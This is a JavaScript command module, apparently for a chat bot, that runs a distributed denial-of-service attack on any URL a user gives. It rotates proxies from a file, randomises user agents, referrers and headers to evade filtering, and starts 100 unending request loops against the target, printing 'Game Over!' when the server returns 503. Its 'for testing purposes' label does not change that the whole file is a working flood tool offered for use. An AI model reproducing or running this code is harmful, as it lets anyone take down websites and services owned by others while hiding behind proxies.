const axios = require("axios");
const fs = require("fs");
const path = require("path");
const SocksProxyAgent = require("socks-proxy-agent");
const HttpsProxyAgent = require("https-proxy-agent");
const {
    rainbow
} = require("gradient-string");

module.exports.config = {
    name: "ddos",
    type: "tools",
    role: 3,
    isPrefix: true,
    aliases: ["flood"],
    info: "Perform DDOS ATTACK on a target URL for testing purposes.",
    author: "Kenneth Panio",
    cd: 10,
    guide: "ddos http://example.com",
    usage: "[url]",
};

const langHeaders = [
    "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
    "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5",
    "en-US,en;q=0.5",
    "en-US,en;q=0.9",
    "de-CH;q=0.7",
    "da, en -gb;q=0.8, en;q=0.7",
    "cs;q=0.5",
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "en-CA,en;q=0.9",
    "en-AU,en;q=0.9",
    "en-NZ,en;q=0.9",
    "en-ZA,en;q=0.9"
];

const referrers = [
    "http://anonymouse.org/cgi-bin/anon-www.cgi/",
    "http://coccoc.com/search#query=",
    "http://ddosvn.somee.com/f5.php?v=",
    "http://engadget.search.aol.com/search?q=",
    "http://engadget.search.aol.com/search?q=query?=query=&q=",
    "http://eu.battle.net/wow/en/search?q=",
    "http://filehippo.com/search?q=",
    "http://funnymama.com/search?q=",
    "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=",
    "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/",
    "http://go.mail.ru/search?mail.ru=1&q=",
    "http://help.baidu.com/searchResult?keywords="
];

const cipherSuites = [
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
    "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM"
];

const acceptHeaders = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
];

const proxyFilePath = path.join(__dirname, "proxy.txt");
const ualist = path.join(__dirname, "ua.txt");
const maxRequests = Number.MAX_SAFE_INTEGER;
const requestsPerSecond = 1000000;
const numThreads = 100;

const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];

const sanitizeUA = (userAgent) => userAgent.replace(/[^\x20-\x7E]/g, "");

const userAgents = () => {
    try {
        return fs.readFileSync(ualist, "utf-8").split("\n").map(line => line.trim());
    } catch (error) {
        console.error(`Failed to read user agent list: ${error}`);
        return [];
    }
};

const loadProxies = () => {
    try {
        return fs.readFileSync(proxyFilePath, "utf-8").split("\n").map(line => line.trim());
    } catch {
        return [];
    }
};

const performAttack = (url, agent, continueAttack, requestsSent, checkCompletion) => {
    if (!continueAttack) return;

    const headersForRequest = {
        "User-Agent": sanitizeUA(getRandomElement(userAgents())),
        "Accept": getRandomElement(acceptHeaders),
        "Accept-Language": getRandomElement(langHeaders),
        "Cache-Control": getRandomElement(cipherSuites),
        "Referer": getRandomElement(referrers),
        "Connection": "keep-alive",
        "DNT": "1",
        "Upgrade-Insecure-Requests": "1",
        "TE": "Trailers"
    };

    axios.get(url, {
        httpAgent: agent,
        headers: headersForRequest,
        timeout: 0
    })
    .then(() => {
        requestsSent++;
        checkCompletion(requestsSent);
        setTimeout(() => performAttack(url, agent, continueAttack, requestsSent, checkCompletion), 0);
    })
    .catch((err) => {
        if (err.code === 'ECONNRESET' || err.code === 'ECONNREFUSED' || err.code === 'EHOSTUNREACH' || err.code === 'ETIMEDOUT' || err.code === "EAI_AGAIN" || err.message === 'Socket is closed') {
            console.log(rainbow("Unable to Attack Target Server Refused!"));
            continueAttack = false;
        } else if (err.response?.status === 404) {
            console.log(rainbow("Target returned 404 (Not Found). Stopping further attacks."));
            continueAttack = false;
        } else if (err.response?.status === 503) {
            console.log(rainbow("Target under heavy load (503) - Game Over!"));
        } else if (err.response?.status === 502) {
            console.log(rainbow("Bad Gateway (502)."));
        } else if (err.response?.status) {
            console.log(rainbow(`DDOS Status: (${err.response?.status})`));
        } else {
            console.log(rainbow(err.message || "ATTACK FAILED!"));
        }
        requestsSent++;
        checkCompletion(requestsSent);
        setTimeout(() => performAttack(url, agent, continueAttack, requestsSent, checkCompletion), 0);
    });
};


module.exports.run = async ({
    args,
    chat,
    font
}) => {
    const targetUrl = args[0];

    if (!targetUrl || !/^https?:\/\//.test(targetUrl)) {
        return chat.reply(font.thin("Invalid URL. Please provide a valid URL starting with http:// or https://"));
    }

    const proxies = loadProxies();
    if (!proxies.length) {
        return chat.reply(font.thin("No proxies found. Please add proxies to the proxy file."));
    }

    let continueAttack = true;
    let requestsSent = 0;

    await chat.reply(font.thin("Starting DDOS ATTACK..."));

    const attackTimeout = setTimeout(() => {
        continueAttack = false;
    }, (maxRequests / requestsPerSecond) * 1000);

    const checkCompletion = (sentRequests) => {
        if (sentRequests >= maxRequests) {
            chat.reply(font.thin("DDOS ATTACK finished."));
            continueAttack = false;
        }
    };

    for (let i = 0; i < numThreads; i++) {
        if (!continueAttack) break;

        const randomProxy = getRandomElement(proxies);
        const proxyParts = randomProxy.split(":");
        const proxyProtocol = proxyParts[0].startsWith("socks") ? "socks5": "http";
        const proxyUrl = `${proxyProtocol}://${proxyParts[0]}:${proxyParts[1]}`;
        const agent = proxyProtocol === "socks5" ? new SocksProxyAgent(proxyUrl): new HttpsProxyAgent(proxyUrl);

        performAttack(targetUrl, agent, continueAttack, requestsSent, checkCompletion);
    }
};